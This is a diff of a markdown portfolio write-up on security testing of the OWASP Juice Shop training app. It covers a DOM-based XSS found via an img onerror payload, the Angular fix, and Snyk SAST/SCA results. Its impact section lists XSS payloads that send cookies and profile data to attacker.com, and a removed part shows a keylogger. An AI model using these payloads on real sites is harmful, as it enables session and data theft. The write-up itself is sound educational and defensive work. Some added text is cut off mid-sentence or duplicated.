@@ -221,72 +221,60 @@ Attackers can craft payloads that pass validation but still exploit SQL injectio
 
 ### Cross-Site Scripting (XSS): DOM-Based JavaScript Injection
 
-**Vulnerability Location:** Search functionality
+**Vulnerability Location:** Search functionality (`frontend/src/app/search-result/search-result.component.ts`, line 147)
 
-This was particularly interesting because my first attempt was blocked—the application had some client-side filtering. I had to think like an attacker to bypass it.
+**OWASP Top 10 Classification:** A03:2021 – Injection
+
+**Attack Vector:** I injected malicious JavaScript into the search input to execute arbitrary code in the browser. The application had client-side filtering but I crafted a payload that bypassed the initial defenses.
 
 **First Attempt - FAILED:**
 ```html
-<script>alert('XSS')</script>
+<script>alert('mira xss')</script>
 ```
+![XSS Script Tag Blocked](screenshots/phase1-manual-testing/03-xss-script-blocked.png)
 
 The application filtered this payload. When I submitted it, nothing happened. The search functionality clearly had some basic security checks that detected the `<script>` tag and sanitized it.
 
 **Second Attempt - SUCCESS:**
 ```html
-<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
 ```
+![XSS Image Tag Success](screenshots/phase1-manual-testing/04-xss-img-success.png)
 
 This worked! JavaScript executed, displaying an alert box.
 
 **Why Did the Image Tag Work When Script Tag Failed?**
 
-The application's filtering mechanism was looking specifically for `<script>` tags—a common but insufficient security measure known as "blacklist filtering." Here's what happened:
-```javascript
-// Likely client-side filter (overly simplistic)
-if (userInput.includes('<script>')) {
-  userInput = userInput.replace(/<script>/gi, '');
-}
+Angular has built-in Content Security Policy (CSP) protection that blocks inline `<script>` tags by default. **With `<script>` tag:**, inline scripts are blocked by security policy and the script tag is ignored. **With `<img>` tag, <img> is a valid HTML element so CSP doesn't block it, src=x is invalid, image fails to load, **onerror event handler triggers** and **JavaScript in onerror is executed**
+
+**DOM-Based XSS - An Important Distinction:**
+
+Looking at the URL structure, this is **DOM-based XSS**, not reflected XSS:
 ```
-
-**The Problem with This Approach:**
-
-Blacklist filtering only blocks what you explicitly list. There are dozens of ways to execute JavaScript in HTML:
-- `<img>` tags with `onerror` events
-- `<svg>` tags with `onload` events
-- `<iframe>` tags with `srcdoc` attributes
-- `<body>` tags with `onload` events
-- Event handlers like `onclick`, `onmouseover`, etc.
-
-**My payload worked because:**
-
-1. **Valid HTML**: `<img>` is a legitimate HTML tag, so it passed the blacklist filter
-2. **Intentional Error**: `src=x` creates an invalid image source
-3. **Event Handler Execution**: When the image fails to load, `onerror` triggers
-4. **JavaScript Execution**: The code in `onerror` (`alert('XSS')`) executes with full privileges
-
-**DOM-Based vs Reflected XSS - An Important Distinction:**
-
-Initially, I thought this was reflected XSS, but upon closer examination, it's **DOM-based XSS**. Here's why:
+URL: http://localhost:3000/#/search?q=<img src=x onerror=alert(1)>
+                          ↑
+                    Fragment identifier (#)
 ```
-URL: https://juice-shop.example.com/#/search?q=<img src=x onerror=alert('XSS')>
-                                       ↑
-                                    Fragment identifier (#)
-```
-
-**DOM-Based XSS Characteristics:**
-- The payload is in the URL fragment (after `#`)
-- Fragments never reach the server (they're client-side only)
-- JavaScript on the page reads `window.location.hash` and inserts it into the DOM
-- The vulnerability exists in client-side JavaScript, not server-side code
 
 **The Vulnerable Client-Side Code:**
-```javascript
-// Client-side JavaScript (vulnerable)
-const searchQuery = window.location.hash.split('?q=')[1];
-document.getElementById('search-results').innerHTML = searchQuery;
-// Directly inserting user input into innerHTML without encoding
+```typescript
+// frontend/src/app/search-result/search-result.component.ts, line 142-147
+filterTable () {
+  let queryParam: string = this.route.snapshot.queryParams.q
+  if (queryParam) {
+    queryParam = queryParam.trim()
+    // ... code omitted ...
+    this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam) // Line 147 - VULNERABLE!
 ```
+**What Makes This Vulnerable:**
+
+Angular has built-in XSS protection that automatically sanitizes HTML. But the developer explicitly **bypassed** this protection using `bypassSecurityTrustHtml()`:
+```typescript
+// VULNERABLE: Explicitly bypassing Angular's XSS protection
+this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
+```
+
+This is then rendered in the HTML template (likely with `[innerHTML]="searchValue"`), which inserts the unsanitized HTML directly into the DOM, allowing my JavaScript to execute.
 
 **Why This Matters:** DOM-based XSS is particularly dangerous because:
 - Server-side security measures can't see it (it's all client-side)
@@ -294,178 +282,70 @@ document.getElementById('search-results').innerHTML = searchQuery;
 - It bypasses server-side input validation
 - Requires different detection and prevention approaches
 
-**Results:**
+**Immediate Impact in This Application:**
 
-![XSS Initial Attempt](screenshots/phase1-manual-testing/03-xss-search-payload.png)
-*First attempt with script tag was blocked, second attempt with img tag succeeded*
+1. **Session Hijacking & Account Takeover**
+   - Attack: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
+   - Attacker steals the user's authentication token from `document.cookie`
+   - With the token, attacker can impersonate the user and access their account
+   - Severity: **Critical** - Full account access without knowing the password
 
-![XSS Execution](screenshots/phase1-manual-testing/04-xss-alert-popup.png)
-*JavaScript execution confirmed - alert popup demonstrates code execution in user's browser*
+2. **Authenticated Request Forgery (CSRF via XSS)**
+   - Attack: `<img src=x onerror="fetch('/api/users/update', {method: 'POST', body: 'email=attacker@evil.com'})">`
+   - User's browser automatically makes requests using their session
+   - Requests succeed because they include the user's authentication
+   - Examples: Change email, update password, modify profile, place orders
 
----
+3. **Data Exfiltration**
+   - Attack: `<img src=x onerror="fetch('/api/user/profile').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil?data='+JSON.stringify(d)))">`
+   - Extract sensitive user data (profile info, payment methods, order history)
+   - Attacker gains access to everything the authenticated user can access
 
-#### Why XSS Matters
+4. **Persistent Account Compromise**
+   - Attacker modifies user email to attacker's address
+   - Changes password to lock out the legitimate user
+   - Maintains permanent access to the account
 
-**Immediate Impact:**
-
-1. **Session Hijacking**: Steal session cookies and impersonate users
-```javascript
-   // Attacker's payload:
-   <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
-```
-
-2. **Credential Theft**: Display fake login forms to capture passwords
-```javascript
-   // Create fake login overlay
-   document.body.innerHTML = '<div style="position:fixed">Fake login form...</div>';
-```
-
-3. **Keylogging**: Record everything the user types
-```javascript
-   document.addEventListener('keypress', (e) => {
-     fetch('https://attacker.com/log?key=' + e.key);
-   });
-```
-
-4. **Account Takeover**: Perform actions on behalf of the victim (transfer money, change email, etc.)
-
-5. **Malware Distribution**: Redirect users to malicious sites
-
-6. **Defacement**: Modify page content to damage reputation
-
-**Real-World Examples:**
-- British Airways (2018): XSS attack led to data breach affecting 380,000 transactions
-- eBay (2014): Stored XSS allowed attackers to redirect users to phishing sites
-- XSS is consistently in OWASP Top 10, affecting an estimated 65% of web applications
 
 **Why This Attack Worked:**
 
-The fundamental problem is **trusting user input in the DOM**. The application took my search query and directly inserted it into the page's HTML without encoding it. This allowed my HTML/JavaScript to be interpreted as code rather than text.
+The fundamental problem is **explicitly bypassing Angular's built-in XSS protection**. The application used `sanitizer.bypassSecurityTrustHtml(queryParam)` on user input from the URL, which disabled Angular's automatic HTML encoding. This allowed the malicious `<img src=x onerror=alert(1)>` payload to execute as code rather than be displayed as text.
 
----
 
-#### How to Prevent XSS
+#### How to Prevent this Vulnerability
 
-**Primary Defense: Output Encoding (Context-Aware)**
+**Primary Defense: Never Bypass Angular's Built-In Protection**
 
-The secure approach is to encode user input based on where it's being inserted:
-```javascript
-// SECURE CODE - HTML Context
-const searchQuery = escapeHtml(userInput);
-document.getElementById('results').textContent = searchQuery; // Safe method
-// or
-document.getElementById('results').innerHTML = DOMPurify.sanitize(searchQuery);
+Angular provides automatic XSS protection through sanitization. **Never use `bypassSecurityTrust*()` methods on user input:**
+```typescript
+// VULNERABLE (current code)
+filterTable() {
+  let queryParam: string = this.route.snapshot.queryParams.q
+  this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam) //DANGEROUS
+}
 
-// HTML Encoding Function
-function escapeHtml(unsafe) {
-  return unsafe
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#039;");
+// SECURE
+filterTable() {
+  let queryParam: string = this.route.snapshot.queryParams.q
+  this.searchValue = queryParam  //Angular sanitizes automatically
 }
 ```
 
-**Why This Works:** 
-- `<img src=x onerror=alert('XSS')>` becomes `&lt;img src=x onerror=alert('XSS')&gt;`
-- The browser displays it as text, not as executable HTML/JavaScript
+**In the template:**
+```html
+<!-- SAFE: Angular's automatic sanitization -->
+<div>{{ searchValue }}</div>
 
-**Context-Specific Encoding:**
+<!-- ALSO SAFE: textContent treats input as text, never HTML -->
+<div [textContent]="searchValue"></div>
 
-Different contexts require different encoding:
-
-1. **HTML Context** (inside tags):
-```javascript
-   <div>${escapeHtml(userInput)}</div>
+<!-- DANGEROUS: Only use with trusted, non-user content -->
+<div [innerHTML]="searchValue"></div>
 ```
 
-2. **JavaScript Context**:
-```javascript
-   <script>
-     const data = ${JSON.stringify(userInput)};
-   </script>
-```
-
-3. **URL Context**:
-```javascript
-   <a href="${encodeURIComponent(userInput)}">Link</a>
-```
-
-4. **CSS Context**:
-```javascript
-   <div style="color: ${escapeCss(userInput)}">
-```
-
-**Additional Defensive Layers:**
-
-1. **Content Security Policy (CSP)**: Browser security header that restricts where scripts can be loaded from
-```javascript
-   // Express.js middleware
-   app.use((req, res, next) => {
-     res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'");
-     next();
-   });
-```
-   With CSP, even if XSS exists, inline scripts won't execute.
-
-2. **Use Safe DOM APIs**:
-```javascript
-   // SAFE
-   element.textContent = userInput;  // Always treats input as text
-   
-   // DANGEROUS
-   element.innerHTML = userInput;    // Interprets HTML/JavaScript
-```
-
-3. **Input Validation** (Defense in Depth, not primary defense):
-```javascript
-   // Reject unexpected characters for specific fields
-   if (email.match(/[<>]/)) {
-     return res.status(400).json({ error: 'Invalid characters' });
-   }
-```
-
-4. **Use Modern Frameworks Safely**: React, Angular, and Vue.js automatically encode output by default
-```jsx
-   // React automatically encodes
-   <div>{userInput}</div>  // Safe
-   
-   // Unless you explicitly use dangerouslySetInnerHTML
-   <div dangerouslySetInnerHTML={{__html: userInput}} />  // Dangerous!
-```
-
-5. **HTTPOnly Cookies**: Prevent JavaScript from accessing session cookies
-```javascript
-   res.cookie('session', token, {
-     httpOnly: true,  // JavaScript can't read this cookie
-     secure: true,     // Only sent over HTTPS
-     sameSite: 'strict'
-   });
-```
-
-6. **DOMPurify Library**: Sanitizes HTML while allowing safe tags
-```javascript
-   import DOMPurify from 'dompurify';
-   const clean = DOMPurify.sanitize(userInput);
-```
-
-**For DOM-Based XSS Specifically:**
-```javascript
-// VULNERABLE
-const search = window.location.hash.split('?q=')[1];
-element.innerHTML = search;
-
-// SECURE
-const search = window.location.hash.split('?q=')[1];
-element.textContent = decodeURIComponent(search);
-// or
-element.innerHTML = DOMPurify.sanitize(decodeURIComponent(search));
-```
-
-**The Reality:** Output encoding is non-negotiable. Every single piece of user input that's displayed on a web page must be encoded for the context where it's used. There are no exceptions.
-
----
+**Why This Works:**
+- `<img src=x onerror=alert(1)>` becomes `&lt;img src=x onerror=alert(1)&gt;`
+- Displayed as plain text, JavaScript never executes
 
 ### Phase 1 Key Findings
 
@@ -474,78 +354,59 @@ element.innerHTML = DOMPurify.sanitize(decodeURIComponent(search));
 | SQL Injection | Critical | Complete database compromise, authentication bypass | A03:2021 - Injection |
 | DOM-Based XSS | High | Session hijacking, credential theft, account takeover | A03:2021 - Injection |
 
-**What Manual Testing Taught Me:**
+**What Manual Testing Showed:**
 
 1. **Security tools find vulnerabilities, but manual testing teaches you to think like an attacker.** Understanding how to bypass filters (like the script tag filter) is crucial for both attackers and defenders.
 
-2. **Context matters.** The same payload (`<script>`) that failed in one context succeeded in another form (`<img onerror>`). Security isn't just about blocking bad input—it's about understanding all the ways something can go wrong.
+2. **Multiple Attack Vectors Exist.** Blocking one technique (like `<script>` tags) doesn't prevent attackers from using alternatives (like event handlers). Real security requires defense in depth not just blocking specific patterns.
 
-3. **Client-side filtering is insufficient.** The application blocked `<script>` tags, but that just forced me to find another attack vector. Defense must happen server-side and must use whitelisting (allow known good) not blacklisting (block known bad).
+3. Blacklisting Cannot Scale**
 
-4. **One vulnerability can cascade.** SQL injection gave me admin access, which could then be used to exploit other vulnerabilities. XSS could steal admin session cookies. Security failures compound.
+The application successfully blocked `<script>` tags but missed event handlers. This is the fundamental problem with blacklist approaches: you're trying to enumerate every possible attack variant, which is impossible.The best practice is to define what you allow (whitelist), not what you forbid (blacklist).
 
-**Personal Insight:** Before this phase, I knew SQL injection and XSS existed. After manually exploiting them, I understood their true impact. This changed how I approach code review—I now see user input as potentially hostile, not just data to be processed.
-
-**Time Investment:** ~2 hours
-
-This hands-on foundation proved invaluable in later phases. When automated tools flagged vulnerabilities, I didn't just see severity scores—I understood exactly what an attacker could do and how much damage they could cause.
+4. **One vulnerability can lead to another.** SQL injection gave me admin access, which could then be used to exploit other vulnerabilities. XSS could steal admin session cookies leading to more security failures.
 
 ---
 
 ## Phase 2: Automated Local Scanning
 
-**Objective:** Implement automated SAST and SCA scanning locally before integrating into CI/CD pipeline.
+**Objective:** To mplement automated SAST and SCA scanning locally before integrating into CI/CD pipeline.
 
 ### Why Local Scanning First?
 
-After manually exploiting vulnerabilities in Phase 1, I had the context to understand what automated tools would find. But I wanted to run scans locally first for several reasons:
+Running security scans locally before CI/CD pipeline integration is an industry best practice for several practical reasons:
 
-1. **Learn the tools** without the complexity of CI/CD
-2. **Understand scan output** and how to interpret results
-3. **Establish a security baseline** for the application
-4. **Verify tools work correctly** before pipeline integration
-5. **Faster iteration** - no waiting for CI/CD to run
+1. **Faster feedback loops.** Local scans provide immediate results without waiting for pipeline execution. Developers can iterate quickly, fix issues, and test again without the overhead of pushing code and waiting for automated processes. This significantly reduces development cycle time compared to discovering issues only in the pipeline.
+
+2. **Establish a baseline.** Running scans locally first allows teams to understand the current security posture before introducing automated checks into CI/CD. This prevents pipeline failures from blocking all development and gives teams time to plan how to address existing issues systematically.
+
+3. **Cost efficiency.** CI/CD resources are metered and shared. Local scanning reduces unnecessary pipeline executions and infrastructure resource consumption. Developers catching issues before commit means fewer pipeline runs overall and lower compute costs.
+
+4. **Tool verification.** Testing security tools locally ensures they function correctly, produce actionable results, and integrate well with the development workflow before introducing them to the shared CI/CD environment where they affect all team members.
+
 
 This approach follows the shift-left security principle: catch vulnerabilities as early as possible in the development process. Finding issues on my local machine before even committing code is as far left as you can shift.
 
-**Industry Standard?** ✅ Yes. Professional developers run security scans locally before committing code. It's faster, cheaper, and prevents vulnerable code from ever entering the repository.
-
----
-
 ### Tool Selection: Snyk
 
-**Why I Chose Snyk:**
+I selected **Snyk** for the following reasons:
 
-After researching various SAST/SCA tools, I selected Snyk because:
-- **Industry leader** with ~40% market share in developer-first security
-- **Integrated SAST and SCA** in one platform (less tool sprawl)
-- **Free tier** suitable for learning and portfolio projects
-- **Developer-friendly** with clear, actionable remediation advice
-- **Used by Fortune 500 companies** (shows industry relevance)
-- **Excellent documentation** and community support
-
-**Alternatives I Considered:**
-- **SonarQube**: Strong SAST but weaker SCA, requires server setup
-- **Checkmarx**: Enterprise-grade but commercial-only, not accessible for portfolio
-- **GitHub Code Scanning**: Good but less comprehensive than Snyk for SCA
-- **Semgrep**: Excellent SAST but no SCA capabilities
-
-Snyk gave me the best combination of capabilities, usability, and industry relevance for this project.
-
----
+- Industry-leading platform with ~40% market share in developer-first security
+- Integrated SAST and SCA in a single tool, reducing tool sprawl and complexity
+- Developer-friendly interface with clear, actionable remediation guidance
+- Comprehensive vulnerability database covering both code and dependency vulnerabilities
+- Suitable free tier for portfolio and learning projects
 
 ### Setup and Authentication
 ```bash
 # Install Snyk CLI globally
 npm install -g snyk
 
-# Authenticate with Snyk
+# Authenticate with Snyk API Token
 snyk auth
 ```
 
-The authentication process opened my browser where I logged into my Snyk account. After authorizing the CLI, the token was automatically saved to `~/.config/configstore/snyk.json`. This token provides API access for running scans.
-
-**Security Note:** This token is sensitive—it provides access to my Snyk account and scan results. I was careful never to commit it to Git. In Phase 3, I securely added it to GitHub Secrets for CI/CD authentication, following the principle of never hardcoding credentials.
+**Security Note:** This token is sensitive; it provides access to my Snyk account and scan results. I was careful never to commit it to Git. In Phase 3, I securely added it to GitHub Secrets for CI/CD authentication, following the principle of never hardcoding credentials.
 
 ---
 
@@ -558,27 +419,25 @@ snyk code test --json > snyk-sast-results.json
 
 **What SAST Does:**
 
-Static Application Security Testing analyzes source code without executing it. It's like a code reviewer who understands security—examining every line for vulnerable patterns, insecure functions, and dangerous coding practices.
+Static Application Security Testing analyzes source code for vulnerable patterns without executing it. It identifies injection vulnerabilities (SQL, XSS, command injection), insecure cryptographic practices, authentication flaws, hardcoded secrets, and other code-level security issues.
 
-**What Snyk Code Looks For:**
-- Injection vulnerabilities (SQL, XSS, Command Injection)
-- Insecure cryptographic practices
-- Authentication and authorization flaws
-- Hardcoded secrets and credentials
-- Path traversal vulnerabilities
-- Insecure deserialization
-- And dozens more vulnerability types
 
 **My Results:**
 
 The scan identified **267 issues** across the codebase:
 
-| Severity | Count | Examples |
-|----------|-------|----------|
-| High | 27 | SQL Injection, XSS, Path Traversal |
-| Medium | 20 | Weak cryptography, insecure configurations |
-| Low | 220 | Code quality issues, best practice violations |
+| Severity | Count |
+|----------|-------|
+| High | 27 |
+| Medium | 20 |
+| Low | 220 |
 
+**Key Findings:**
+- 7 SQL injection vulnerabilities
+- 15+ XSS vulnerabilities across components
+- Hardcoded JWT secrets in configuration
+- Path traversal vulnerabilities
+  
 **Key Findings:**
 
 ![SAST Scan Results](screenshots/phase2-local-scanning/01-sast-scan-summary.png)
@@ -587,15 +446,28 @@ The scan identified **267 issues** across the codebase:
 ![SAST SQL Injection Finding](screenshots/phase2-local-scanning/02-sast-sql-injection-detail.png)
 *Detailed view of SQL injection vulnerability in routes/login.ts - the same one I exploited manually*
 
+
 **Analysis:**
 
-This was a "validation moment" for me. The scan confirmed the SQL injection vulnerability I manually exploited in Phase 1, but it also found:
+The 267 issues break down across severity levels, with the 27 high-severity findings being the most critical. The 7 SQL injection vulnerabilities are direct attack vectors; they let attackers manipulate database queries to extract sensitive data or bypass authentication. The 15+ XSS vulnerabilities are equally dangerous, allowing attackers to inject malicious scripts that execute in users' browsers to steal session tokens or credentials. The hardcoded JWT secrets are particularly problematic because these are the authentication keys—if visible in the code, an attacker can forge tokens and impersonate any user in the system. The path traversal vulnerabilities c
+The 220 low-severity findings mostly represent code quality issues and best practice violations that create security debt. While individually less critical, they contribute to a weak security posture that makes the application easier to attack overall.
+
+**SAST Limitations:**
+
+SAST is powerful at identifying code-level vulnerability patterns, but it has important blind spots. It can't always verify whether a flagged vulnerability is actually exploitable in practice; it identifies the pattern but runtime context sometimes prevents exploitation. SAST can't detect issues that only manifest when the application runs, like missing security headers, broken session management or insecure business logic. Also, SAST can't analyze dependencies; that's where SCA comes in.
+
+This is why security testing requires multiple approaches. SAST catches code-level issues but combining it with manual testing, dynamic testing, and dependency scanning provides comprehensive coverage that no single tool can achieve.
+
+**Analysis:**
+The scan confirmed the SQL injection vulnerability I manually exploited in Phase 1, but it also found:
 - **7 additional SQL injection vulnerabilities** I hadn't discovered manually
 - **15+ XSS vulnerabilities** across different components
 - **Hardcoded JWT secrets** (critical for authentication security)
 - **Path traversal vulnerabilities** that could allow file system access
 
-Seeing the SQL injection I'd already exploited in the scan results built my confidence in the tool—it wasn't just producing theoretical findings, but catching real, exploitable vulnerabilities.
+This demonstrates why automated scanning is important; it provides comprehensive coverage across the entire codebase in minutes, whereas manual testing can only realistically cover a fraction of the code. The combination of automated scanning for breadth and manual testing for deeper exploitation understanding provides the most effective approach.
+
+
 
 **What SAST Cannot Tell You:**
 
@@ -617,14 +489,9 @@ snyk test --json > snyk-sca-results.json
 ```
 
 **What SCA Does:**
+Modern applications depend heavily on third-party packages. Software Composition Analysis scans all dependencies against known vulnerability databases (CVEs and security advisories) to identify compromised or vulnerable packages in the dependency tree.
 
-Modern applications are mostly third-party code. The Juice Shop application has 998 npm dependencies, and my code is just a small fraction of the total codebase. Software Composition Analysis scans all these dependencies for known vulnerabilities by comparing them against vulnerability databases (CVEs, security advisories, etc.).
-
-**Why This Matters to Me:**
-
-I didn't write the code in these dependencies, but I'm responsible for their security. A vulnerability in a package I imported can compromise my entire application, regardless of how secure my own code is. This is a sobering reality of modern development.
-
-**My Results:**
+**Results:**
 
 The scan analyzed **998 dependencies** and found **62 vulnerabilities**:
 
@@ -635,41 +502,13 @@ The scan analyzed **998 dependencies** and found **62 vulnerabilities**:
 | Medium | 24 | 26 |
 | Low | 12 | 12 |
 
-**Critical Finding: vm2 Remote Code Execution**
+**Notable Finding:**
 
 ![SCA Critical Finding](screenshots/phase2-local-scanning/03-sca-critical-rce.png)
-*Critical RCE vulnerability in vm2 package - this was eye-opening*
 
-The most severe finding was a Remote Code Execution vulnerability in the `vm2` package (version 3.9.11):
-```
-CVE-2023-30547
-Severity: Critical (9.8 CVSS)
-Package: vm2@3.9.11
-Vulnerable Path: juice-shop@14.5.1 > vm2@3.9.11
-Impact: Attackers can escape the sandbox and execute arbitrary code
-Fix Available: Upgrade to vm2@3.9.18
-```
+A critical Remote Code Execution vulnerability (CVE-2023-30547) in the vm2 package allowed arbitrary code execution by escaping the sandbox environment. This was a transitive dependency—not directly imported but included through the dependency chain.
 
-**Why This Scared Me:**
 
-This vulnerability allows attackers to break out of the vm2 sandbox (which is supposed to safely isolate code execution) and run arbitrary commands on the server. They could:
-- Read sensitive files
-- Install backdoors
-- Exfiltrate data
-- Pivot to other systems
-- Completely compromise the server
-
-And I didn't even know vm2 was being used—it was a transitive dependency (a dependency of a dependency). This taught me that **you're responsible for your entire dependency tree, not just direct dependencies**.
-
-**The Sobering Math:**
-```
-My code: ~5,000 lines
-Dependency code: ~500,000+ lines
-
-Ratio: I'm responsible for 100x more code than I wrote
-
-Security implications: I can write perfect code and still be vulnerable
-```
 
 **Why This Matters:**
 
@@ -684,6 +523,16 @@ Dependencies often constitute 70-90% of application code. The software supply ch
 - **SCA** examines code I import
 
 Both are necessary. Even if my code is perfect, vulnerable dependencies can destroy security. Even if all dependencies are secure, my code can introduce vulnerabilities.
+### Phase 2 Summary
+
+**Total Security Issues Identified:**
+- SAST: 267 code-level vulnerabilities
+- SCA: 62 dependency vulnerabilities
+- **Combined: 329 security findings**
+
+**Key Takeaway:**
+
+Automated scanning is essential for comprehensive vulnerability detection. Manual testing alone cannot scale to identify hundreds of issues across custom code and a dependency tree. By establishing local scanning before CI/CD integration, the foundation is set for continuous security verification in the pipeline.
 
 ---
 
